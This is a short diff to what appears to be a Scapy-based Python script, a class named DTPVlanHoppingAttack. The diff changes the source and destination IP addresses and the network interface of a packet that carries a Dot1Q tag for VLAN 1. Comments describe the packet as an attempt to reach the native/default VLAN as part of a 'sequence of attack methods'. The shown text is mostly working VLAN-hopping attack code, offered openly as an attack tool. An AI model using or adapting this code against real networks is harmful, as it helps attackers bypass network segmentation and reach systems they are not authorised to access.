@@ -66,8 +66,8 @@ class DTPVlanHoppingAttack:
         )/Dot1Q(
             vlan=1  # Try to access native/default VLAN
         )/IP(
-            src="10.0.0.100",
-            dst="10.0.0.1"
+            src="192.168.2.5",
+            dst="192.168.1.5"
         )/ICMP()
         
         print("[+] Sending VLAN Hopping Probe")
@@ -78,7 +78,7 @@ class DTPVlanHoppingAttack:
 def main():
     # Initialize the attack
     attack = DTPVlanHoppingAttack(
-        interface='eth0'  # Replace with your network interface
+        interface='enp0s3'  # Replace with your network interface
     )
     
     # Sequence of attack methods
